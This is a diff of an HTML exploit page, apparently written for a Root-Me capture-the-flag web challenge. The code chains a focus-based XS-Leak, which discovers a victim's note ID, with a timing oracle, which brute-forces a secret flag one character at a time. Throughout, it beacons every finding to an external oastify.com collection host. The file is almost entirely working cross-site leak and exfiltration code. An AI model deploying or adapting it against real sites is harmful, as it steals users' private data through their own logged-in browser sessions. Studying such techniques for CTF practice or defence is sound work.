@@ -4,115 +4,185 @@
     <title>Automated Verification Exploit</title>
 </head>
 <body>
-    <h1>Processing safe content rendering...</h1>
-    <div id="status" style="font-family: sans-serif; color: blue;">Initializing session...</div>
+    <div id="status" style="font-family: monospace; padding: 8px; background: #111; color: #0f0;">Initializing...</div>
 
     <script>
-        const targetMain = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-        const exfilUrl   = "http://c6jebfw4342upnf3c2zfoga2zt5ktch1.oastify.com/?flag=";
+        const BASE  = "https://web-client-ch56.challenge01.root-me.org:58056";
+        const EXFIL = "http://c6jebfw4342upnf3c2zfoga2zt5ktch1.oastify.com/?data=";
 
-        // ── TUNING ─────────────────────────────────────────────────────────────
-        // Widen the hit window significantly — avoid missing chars at the edges.
-        const HIT_MIN = 1500;   // was 2000 — capture slower-but-valid matches
-        const HIT_MAX = 5000;   // was 3000 — allow for higher-latency hits
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        const log   = m  => { console.log(m); document.getElementById("status").innerText = m; };
+        const exfil = v  => { new Image().src = EXFIL + encodeURIComponent(v); console.log("[EXFIL]", v); };
 
-        // Flag prefix already confirmed by previous run.
-        // The bot returned "fake" — start from there so we don't re-probe known chars.
-        let currentFlag = "sc4r3_4b0ut_+s4mes1t3_";
+        // ── PHASE 1: Focus XS-Leak — find note ID ───────────────────────────────
+        // Technique from: https://portswigger.net/research/xs-leak-leaking-ids-using-focus
+        //
+        // How it works:
+        //   1. Load the target page in a hidden iframe (ONE HTTP request total)
+        //   2. Change only the URL fragment: iframe.src = page + "#<candidate>"
+        //      → Hash-only change = NO new HTTP request, browser just scrolls
+        //   3. If an element with id="<candidate>" exists on the page:
+        //        browser focuses it → focus leaves our window → window.onblur fires
+        //   4. Detected blur = found the note ID
+        //
+        // Target: the challenge homepage at / renders:
+        //   <a href="/notes/XXXX">Notes</a>
+        // If the page also has an element with id="XXXX" (e.g. the link itself
+        // or a nav anchor), blur will fire on the matching candidate.
+        //
+        // ⚠️  If the homepage has no id= attributes matching the note ID,
+        //    fall back to /notes/ or /notes/<id> pages and check their source.
 
-        // Full printable charset — the previous run missed chars after "fake"
-        // because the alphabet was too narrow.
-        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_+!@#$%&*()-=[]{}|;:,.<>?";
-
-        const targetBase = "https://web-client-ch56.challenge01.root-me.org:58056/notes/392/";
-
-        // ── HELPERS ────────────────────────────────────────────────────────────
-        const sleep = ms => new Promise(res => setTimeout(res, ms));
-
-        /**
-         * Use <object> instead of <img> — fires onload for ALL content-types
-         * (HTML, JSON, text), not just images. More reliable timing signal.
-         */
-        function probeObject(url) {
+        function findNoteIdViaFocus(targetPage, start = 1, end = 5000) {
             return new Promise(resolve => {
-                const obj   = document.createElement("object");
-                const start = performance.now();
-                obj.onload  = obj.onerror = () => {
-                    resolve(performance.now() - start);
-                    obj.remove();
+                let candidate = start;
+                let found     = false;
+                let timer;
+
+                const iframe = document.createElement("iframe");
+                iframe.style.cssText = "position:fixed;width:1px;height:1px;opacity:0.01;top:0;left:0;border:0;";
+                document.body.appendChild(iframe);
+
+                // ── The core of the PortSwigger technique ──
+                // Blur on our window = iframe stole focus = matching element exists
+                window.onblur = () => {
+                    if (found) return;
+                    clearTimeout(timer);
+                    found = true;
+
+                    exfil("NOTE_ID_FOCUS=" + candidate);
+                    log("✅ Focus hit → Note ID: " + candidate);
+                    iframe.remove();
+                    window.onblur = null;
+                    resolve(candidate);
                 };
-                obj.data = url + "?_=" + Math.random(); // cache-bust
+
+                function tryNext() {
+                    if (found) return;
+
+                    if (candidate > end) {
+                        // Exhausted range — didn't find via focus
+                        exfil("FOCUS_EXHAUSTED_no_hit_in_" + start + "_" + end);
+                        log("Focus leak found nothing in " + start + "–" + end);
+                        iframe.remove();
+                        window.onblur = null;
+                        resolve(null);
+                        return;
+                    }
+
+                    if (candidate % 200 === 0) exfil("FOCUS_PROGRESS=" + candidate);
+                    log("Focus probing ID: " + candidate);
+
+                    // Hash-only navigation — no new HTTP request sent to target server.
+                    // Browser checks if id="<candidate>" element exists and focuses it.
+                    iframe.src = targetPage + "#" + candidate;
+
+                    candidate++;
+                    // 50ms per candidate — same interval as the PortSwigger PoC.
+                    // Lower = faster but risks missing the blur event.
+                    timer = setTimeout(tryNext, 50);
+                }
+
+                // Load the target page once, then begin iterating hashes
+                exfil("FOCUS_PAGE_LOADING=" + targetPage);
+                iframe.src = targetPage;
+
+                iframe.onload = () => {
+                    exfil("FOCUS_PAGE_LOADED_scanning_1_to_" + end);
+                    log("Page loaded. Scanning IDs 1–" + end + " via focus...");
+
+                    // Give the page a moment to fully settle before we start
+                    setTimeout(tryNext, 300);
+                };
+            });
+        }
+
+        // ── PHASE 2: Timing oracle — brute-force flag ────────────────────────────
+        // URL: /notes/<noteId>/<prefix>
+        // Server sleeps ~2s when prefix matches → measured as "slow" response
+
+        function probe(url) {
+            return new Promise(resolve => {
+                const obj = document.createElement("object");
+                const t0  = performance.now();
+                obj.onload = obj.onerror = () => { resolve(performance.now() - t0); obj.remove(); };
+                obj.data  = url + "?_=" + Math.random();
                 obj.style.display = "none";
                 document.body.appendChild(obj);
             });
         }
 
-        /**
-         * Adaptive baseline: measure 3 known-miss strings first,
-         * then set threshold = baseline + 1200ms.
-         * Adapts to the bot's current network conditions automatically.
-         */
-        async function calibrate() {
-            const misses = [
-                targetBase + "zz_no_match_1",
-                targetBase + "zz_no_match_2",
-                targetBase + "zz_no_match_3"
-            ];
+        async function calibrate(noteId) {
+            // Probe 3 guaranteed-miss strings to measure the bot's baseline latency.
+            // threshold = baseline + 1200ms adapts automatically to network conditions.
+            const misses = ["zz_nope_1", "zz_nope_2", "zz_nope_3"].map(
+                m => `${BASE}/notes/${noteId}/${m}`
+            );
             let total = 0;
-            for (const url of misses) {
-                total += await probeObject(url);
-                await sleep(200);
-            }
-            const baseline  = total / misses.length;
+            for (const u of misses) { total += await probe(u); await sleep(150); }
+            const baseline  = total / 3;
             const threshold = baseline + 1200;
-            new Image().src = exfilUrl + "BASELINE_" + Math.round(baseline) + "ms_THRESHOLD_" + Math.round(threshold) + "ms";
+            exfil(`CALIBRATED_base=${Math.round(baseline)}ms_thresh=${Math.round(threshold)}ms`);
             return threshold;
         }
 
-        // ── MAIN ───────────────────────────────────────────────────────────────
-        async function startExploit() {
-            new Image().src = exfilUrl + "BOT_ARRIVED_OK";
-            document.getElementById("status").innerText = "Connected. Calibrating...";
+        async function bruteForceFlag(noteId) {
+            const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_+!@#$%&*()-";
+            let flag = "";
+            exfil("BRUTE_START_note=" + noteId);
 
-            // Open authenticated session
-            window.open(targetMain, "auth_win");
-            await sleep(2000);
+            const threshold = await calibrate(noteId);
 
-            // Measure adaptive threshold
-            const threshold = await calibrate();
-            document.getElementById("status").innerText = "Calibrated. Brute-forcing...";
-
-            let cracking = true;
-            while (cracking) {
-                let foundChar = false;
-
-                for (const char of alphabet) {
-                    const candidate = currentFlag + char;
-                    const url       = targetBase + encodeURIComponent(candidate);
-
-                    const t = await probeObject(url);
-                    document.getElementById("status").innerText = `Trying: "${candidate}" → ${Math.round(t)}ms (threshold: ${Math.round(threshold)}ms)`;
-
-                    // Hit if above adaptive threshold AND below a hard cap (rules out timeouts)
-                    if (t > threshold && t < 6000) {
-                        currentFlag = candidate;
-                        foundChar   = true;
-                        new Image().src = exfilUrl + "PROGRESS_" + encodeURIComponent(currentFlag);
-                        await sleep(500);
+            while (true) {
+                let found = false;
+                for (const c of ALPHABET) {
+                    const candidate = flag + c;
+                    const url = `${BASE}/notes/${noteId}/${encodeURIComponent(candidate)}`;
+                    const t   = await probe(url);
+                    log(`"${candidate}" → ${Math.round(t)}ms / thresh ${Math.round(threshold)}ms`);
+                    if (t > threshold && t < 7000) {
+                        flag  = candidate;
+                        found = true;
+                        exfil("PROGRESS_" + flag);
+                        await sleep(300);
                         break;
                     }
-                    await sleep(200);
+                    await sleep(150);
                 }
-
-                if (!foundChar) {
-                    new Image().src = exfilUrl + "COMPLETE_" + encodeURIComponent(currentFlag);
-                    cracking = false;
-                    document.getElementById("status").innerText = "Done: " + currentFlag;
+                if (!found) {
+                    exfil("COMPLETE_" + flag);
+                    log("🏁 Flag: " + flag);
+                    break;
                 }
             }
         }
 
-        window.onload = () => setTimeout(startExploit, 500);
+        // ── MAIN ─────────────────────────────────────────────────────────────────
+        async function main() {
+            exfil("BOT_ARRIVED_OK");
+
+            // Open session in background tab
+            window.open(`${BASE}/notes/`, "_blank");
+            await sleep(2000);
+
+            // Phase 1: Focus XS-Leak — find the bot's note ID
+            // Targets the homepage which renders the user's note link in the nav.
+            // The focus event fires if the page has an element with id=<noteId>.
+            const noteId = await findNoteIdViaFocus(BASE + "/", 1, 5000);
+
+            if (!noteId) {
+                exfil("PHASE1_FAILED_no_note_id");
+                log("Phase 1 failed — page may not have matching id= attributes.");
+                return;
+            }
+
+            await sleep(500);
+
+            // Phase 2: Timing oracle
+            await bruteForceFlag(noteId);
+        }
+
+        window.onload = () => setTimeout(main, 600);
     </script>
 </body>
 </html>
